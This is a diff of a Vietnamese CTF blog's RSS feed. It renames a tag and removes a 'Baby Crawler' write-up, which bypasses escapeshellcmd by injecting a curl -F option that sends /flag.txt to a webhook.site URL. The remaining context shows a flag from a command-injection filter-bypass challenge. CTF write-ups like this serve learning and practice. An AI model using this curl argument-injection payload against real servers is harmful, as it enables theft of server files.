@@ -1,9 +1,9 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
-        <title>easy_ctf - Tag - g03m0n</title>
-        <link>https://g03m0n.github.io/tags/easy_ctf/</link>
-        <description>easy_ctf - Tag - g03m0n</description>
-        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/tags/easy_ctf/" rel="self" type="application/rss+xml" /><item>
+        <title>cookiectf - Tag - g03m0n</title>
+        <link>https://g03m0n.github.io/tags/cookiectf/</link>
+        <description>cookiectf - Tag - g03m0n</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/tags/cookiectf/" rel="self" type="application/rss+xml" /><item>
     <title>CookieCTF - The Existed File</title>
     <link>https://g03m0n.github.io/posts/cookiectf-the-existed-file/cookiectf-the-existed-file/</link>
     <pubDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</pubDate>
@@ -56,38 +56,6 @@ Sau đó sẽ sử dung hàm <code>is_blacklisted</code> để kiểm tra <code>
 <p></p>
 <p>Tải file <code>flag.txt</code>về ta được flag:
 <code>CHH{os_c0mManD_INj3cTi0N_bypa5S_FIL7Er_b1f4b3371b6a365f47334d3ec07a8d0e}</code></p>
-]]></description>
-</item>
-<item>
-    <title>CookieCTF - Baby Crawler</title>
-    <link>https://g03m0n.github.io/posts/cookiectf-baby-crawler/cookiectf-baby-crawl/</link>
-    <pubDate>Fri, 19 Jan 2024 21:29:01 &#43;0800</pubDate>
-    <author>g03m0n</author>
-    <guid>https://g03m0n.github.io/posts/cookiectf-baby-crawler/cookiectf-baby-crawl/</guid>
-    <description><![CDATA[<p>Link challenge tại <a href="https://battle.cookiearena.org/challenges/web/baby-crawler" target="_blank" rel="noopener noreffer">đây</a>
-</p>
-<p>Đây là giao diện chính của challenge:</p>
-<p></p>
-<p>Ở challenge này, khi ấn vào nút <code>CRAWL</code> trang web sẽ hiển thị một đường link <code>Cached File</code></p>
-<p></p>
-<p>Khi click vào đường link ta sẽ thấy <code>html</code> của trang web</p>
-<p></p>
-<p>Quay trở lại giao diện chính, kiểm tra source code thì phát hiện 1 endpoint <code>?debug</code></p>
-<p></p>
-<p>Kiểm tra thì thấy được đoạn code chạy ở server-side. Chú ý vào đoạn code này:</p>
-<p></p>
-<p>Đoạn code sẽ kiểm tra url người dung nhập vào có sử dụng HTTP/HTTPS hay không, nếu có website sẽ <code>crawl</code> web bằng lệnh <code>curl</code>, sau đó lưu nội dung <code>crawl</code> được vào một file nằm trong thư mục <code>./cache</code>.
-Vì có hàm <code>shell_exec</code> nên đây có thể là một lỗi Command Injection. Ở đây hàm <code>escapeshellcmd</code> được dùng để chặn các ký tự  <code>&amp;#;``|*?~&lt;&gt;^()[]{}$\</code>, <code>\x0A</code> và <code>\xFF</code> từ <code>url</code> người dùng nhập vào.</p>
-<p></p>
-<p>Vì vậy ta không thể bypass được challenge này theo hướng sử dụng các ký tự <code>;</code> hay <code>&amp;</code>, bắt buộc phải đi theo một hướng khác.
-Thay vì <code>inject</code> một câu lệnh để server thực hiện sau khi đã thực hiện lệnh <code>curl</code>, ta có thể tận dụng trực tiếp câu lệnh <code>curl</code> để gửi nội dung của file tới một server do ta tự dựng lên với option <code>-F</code>.</p>
-<p>Mình sẽ sử dụng <a href="https://webhook.site" target="_blank" rel="noopener noreffer">webhook.site</a>
- để làm server nhận file gửi đến.</p>
-<p></p>
-<p>Payload:
-<code>http://18.142.90.137:31315/ -F file=@/flag.txt https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11</code></p>
-<p></p>
-<p>Tải file <code>flag.txt</code> về ta được flag: <code>CHH{b48Y_CUrl_CrAwl3r_1c7ddee4c53dfc5fc952c63ca0aebb9a}</code></p>
 ]]></description>
 </item>
 </channel>
